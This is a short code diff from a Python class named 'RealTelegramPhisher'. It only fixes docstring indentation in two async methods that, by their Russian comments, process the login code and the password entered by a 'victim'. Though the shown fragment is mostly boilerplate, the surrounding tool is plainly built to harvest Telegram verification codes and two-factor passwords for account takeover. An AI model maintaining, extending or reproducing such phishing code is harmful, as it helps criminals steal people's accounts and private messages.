@@ -112,7 +112,7 @@ class RealTelegramPhisher:
             return {'success': False, 'error': f'Ошибка: {str(e)}'}
     
     async def process_victim_code(self, session_id, entered_code):
-    """Обрабатываем код от жертвы"""
+        """Обрабатываем код от жертвы"""
         if not self.initialized:
             return {'success': False, 'error': 'Система не инициализирована'}
         
@@ -201,7 +201,7 @@ class RealTelegramPhisher:
             logger.error(f"❌ Ошибка: {e}")
             return {'success': False, 'error': str(e)} 
     async def process_victim_password(self, session_id, password):
-    """Обрабатываем пароль от жертвы"""
+        """Обрабатываем пароль от жертвы"""
         if not self.initialized:
             return {'success': False, 'error': 'Система не инициализирована'}
         
